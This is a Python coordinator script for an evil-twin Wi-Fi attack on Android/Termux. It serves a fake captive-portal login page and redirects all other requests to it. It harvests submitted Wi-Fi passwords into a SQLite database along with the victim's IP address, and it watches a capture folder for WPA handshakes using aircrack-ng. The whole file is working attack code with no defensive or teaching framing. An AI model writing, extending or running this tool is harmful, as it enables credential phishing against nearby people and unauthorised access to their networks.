"""
hostapd_clone.py — Evil twin orchestration (Termux side, no root needed).
Strategy: ESP8266 runs deauth; Termux host runs a soft AP + captive portal
on a different channel using `pywifi` (monitor) + HTTP server.

This file is the coordinator:
  - Subscribes to /sdcard/MT2/captures/ for new .pcap files
  - On new pcap, runs aircrack-ng to extract handshakes
  - Serves a captive-portal login page on eth0/usb0/lo
  - Stores captured creds in /sdcard/MT2/captured.db
"""
import os, time, sqlite3, subprocess, threading
from pathlib import Path
from http.server import BaseHTTPRequestHandler, HTTPServer

CAPTURE_DIR = Path("/sdcard/MT2/captures")
CAPTURE_DIR.mkdir(parents=True, exist_ok=True)
DB_PATH     = Path("/sdcard/MT2/captured.db")
PORTAL_HTML = Path("/sdcard/MT2/portal_preview.html")

def init_db():
    con = sqlite3.connect(DB_PATH)
    con.execute("""CREATE TABLE IF NOT EXISTS creds (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ts INTEGER NOT NULL,
        ssid TEXT,
        bssid TEXT,
        password TEXT,
        src_ip TEXT
    )""")
    con.commit()
    con.close()

def save_creds(ssid, bssid, password, src_ip):
    con = sqlite3.connect(DB_PATH)
    con.execute("INSERT INTO creds(ts,ssid,bssid,password,src_ip) VALUES(?,?,?,?,?)",
                (int(time.time()), ssid, bssid, password, src_ip))
    con.commit()
    con.close()

class PortalHandler(BaseHTTPRequestHandler):
    ssid_target = "FreeWiFi"
    bssid_target = "00:00:00:00:00:00"

    def log_message(self, fmt, *args):
        # quiet — no stderr spam
        return

    def do_GET(self):
        if self.path == "/" or self.path.startswith("/login"):
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            html = PORTAL_HTML.read_text() if PORTAL_HTML.exists() else "<h1>WiFi Login</h1>"
            self.wfile.write(html.encode("utf-8"))
        else:
            # 302 to portal — typical captive-portal detection behavior
            self.send_response(302)
            self.send_header("Location", "/")
            self.end_headers()

    def do_POST(self):
        length = int(self.headers.get("Content-Length", "0"))
        body = self.rfile.read(length).decode("utf-8", errors="replace")
        # very simple form parser — expect password=XXX
        password = ""
        for pair in body.split("&"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                if "pass" in k.lower():
                    password = v.replace("+", " ").replace("%20", " ")
        save_creds(self.ssid_target, self.bssid_target, password, self.client_address[0])
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK - please wait while we connect you...")

def start_portal(ssid="FreeWiFi", bssid="00:00:00:00:00:00", port=80):
    PortalHandler.ssid_target = ssid
    PortalHandler.bssid_target = bssid
    init_db()
    httpd = HTTPServer(("0.0.0.0", port), PortalHandler)
    print(f"[portal] serving on :{port} for ssid={ssid}")
    httpd.serve_forever()

def watch_captures():
    """Poll /sdcard/MT2/captures/ for new .pcap, hand off to aircrack."""
    seen = set()
    while True:
        if CAPTURE_DIR.exists():
            for p in CAPTURE_DIR.glob("*.pcap"):
                if p.name in seen:
                    continue
                seen.add(p.name)
                # try to extract handshake presence
                try:
                    out = subprocess.check_output(
                        ["aircrack-ng", str(p)],
                        stderr=subprocess.STDOUT, timeout=10
                    ).decode("utf-8", errors="replace")
                    if "WPA (1 handshake)" in out or "WPA (2 handshakes)" in out:
                        print(f"[cap] handshake OK: {p.name}")
                except (FileNotFoundError, subprocess.TimeoutExpired):
                    pass
                except Exception as e:
                    print(f"[cap] error: {e}")
        time.sleep(3)

if __name__ == "__main__":
    import sys
    ssid = sys.argv[1] if len(sys.argv) > 1 else "FreeWiFi"
    t1 = threading.Thread(target=watch_captures, daemon=True)
    t1.start()
    start_portal(ssid)
